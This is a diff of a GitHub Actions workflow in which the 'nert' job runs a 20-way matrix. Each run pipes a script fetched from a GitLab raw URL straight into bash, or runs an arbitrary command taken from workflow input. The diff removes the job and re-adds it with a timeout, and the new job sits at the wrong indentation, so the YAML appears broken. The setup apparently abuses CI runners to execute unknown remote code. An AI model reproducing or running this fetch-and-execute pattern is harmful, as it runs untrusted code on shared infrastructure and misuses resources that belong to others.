@@ -23,18 +23,19 @@ jobs:
         continue-on-error: true
         run: echo hert
 
-  nert:
-    needs: [hert]
-    runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false        
-      matrix:
-        build: [C.1, D.1]
-        flag: [A, B, C, D, E, F, G, H, I, J]
-    steps:                   
-      - name: Jalankan perintah
-        continue-on-error: true
-        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} && sleep 360s
+nert:
+  needs: [hert]
+  runs-on: ubuntu-latest
+  timeout-minutes: 5          
+  strategy:
+    fail-fast: false
+    matrix:
+      build: [C.1, D.1]
+      flag: [A, B, C, D, E, F, G, H, I, J]
+  steps:
+    - name: Jalankan perintah
+      continue-on-error: true
+      run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
 
 
   dert:
